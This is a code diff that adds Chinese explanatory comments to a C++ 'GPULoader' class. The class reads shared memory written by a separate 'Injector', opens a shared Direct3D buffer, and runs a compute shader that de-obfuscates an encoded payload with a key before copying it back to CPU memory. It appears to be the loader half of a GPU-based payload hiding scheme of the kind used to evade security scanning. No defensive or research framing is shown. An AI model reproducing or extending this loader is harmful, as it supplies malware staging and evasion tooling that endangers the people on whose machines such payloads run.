@@ -70,6 +70,7 @@ bool GPULoader::loadComputeShader() {
         return false;
     }
 
+    // 目标端只保存编译好的字节码，运行时加载到 D3D 设备。
     HRESULT hr = device->CreateComputeShader(
         shaderBytecode.data(),
         shaderBytecode.size(),
@@ -86,6 +87,7 @@ bool GPULoader::loadComputeShader() {
 }
 
 bool GPULoader::loadSharedGPUData() {
+    // 读取 Injector 写入的共享内存以取得共享缓冲句柄及元数据。
     HANDLE hSharedMem = OpenFileMappingW(
         FILE_MAP_READ,
         FALSE,
@@ -123,6 +125,7 @@ bool GPULoader::loadSharedGPUData() {
 }
 
 bool GPULoader::openSharedBuffer() {
+    // 将 DXGI 共享句柄重新打开成当前设备可用的 ID3D11Buffer。
     HRESULT hr = device->OpenSharedResource(
         sharedBufferHandle,
         __uuidof(ID3D11Buffer),
@@ -153,6 +156,7 @@ bool GPULoader::createDecodeResources() {
     D3D11_BUFFER_DESC encodedDesc;
     encodedBuffer->GetDesc(&encodedDesc);
 
+    // 为共享缓冲区创建 SRV/UAV，从而在计算着色器中读取编码数据并写入解码结果。
     D3D11_SHADER_RESOURCE_VIEW_DESC srvDesc = {};
     srvDesc.Format = DXGI_FORMAT_UNKNOWN;
     srvDesc.ViewDimension = D3D11_SRV_DIMENSION_BUFFER;
@@ -190,6 +194,7 @@ bool GPULoader::createDecodeResources() {
         return false;
     }
 
+    // CPU 侧 staging buffer 用于 CopyResource 后 map 回系统内存。
     D3D11_BUFFER_DESC stagingDesc = {};
     stagingDesc.ByteWidth = encodedDesc.ByteWidth;
     stagingDesc.Usage = D3D11_USAGE_STAGING;
@@ -211,6 +216,7 @@ bool GPULoader::createDecodeResources() {
     params.payloadSizeInDwords = (payloadSize + 3) / 4;
     params.encodeKey = encodeKey;
 
+    // 常量缓冲封装 payload 总长度与密钥，供 compute shader 复原字流。
     D3D11_BUFFER_DESC cbDesc = {};
     cbDesc.ByteWidth = sizeof(DecodeParams);
     cbDesc.Usage = D3D11_USAGE_DEFAULT;
@@ -229,6 +235,7 @@ bool GPULoader::createDecodeResources() {
 }
 
 bool GPULoader::decodePayloadOnGPU() {
+    // 设置计算着色器绑定并 dispatch，逆向执行与 Injector 同样的混淆逻辑。
     context->CSSetShader(decodeShader, nullptr, 0);
     context->CSSetShaderResources(0, 1, &encodedSRV);
     context->CSSetUnorderedAccessViews(0, 1, &decodedUAV, nullptr);
@@ -245,6 +252,7 @@ bool GPULoader::decodePayloadOnGPU() {
     context->CSSetShaderResources(0, 1, &nullSRV);
     context->CSSetUnorderedAccessViews(0, 1, &nullUAV, nullptr);
 
+    // 将 GPU 解码结果拷贝到 staging buffer，便于后续 Map。
     context->CopyResource(stagingBuffer, decodedBuffer);
 
     return true;
@@ -254,6 +262,7 @@ std::vector<uint8_t> GPULoader::retrieveDecodedPayload() {
     std::vector<uint8_t> payload;
 
     D3D11_MAPPED_SUBRESOURCE mapped;
+    // Map 后直接复制 payloadSize 字节回到 CPU 内存。
     HRESULT hr = context->Map(stagingBuffer, 0, D3D11_MAP_READ, 0, &mapped);
     if (FAILED(hr)) {
         std::cerr << "[gpuloader] failed to map staging buffer\n";
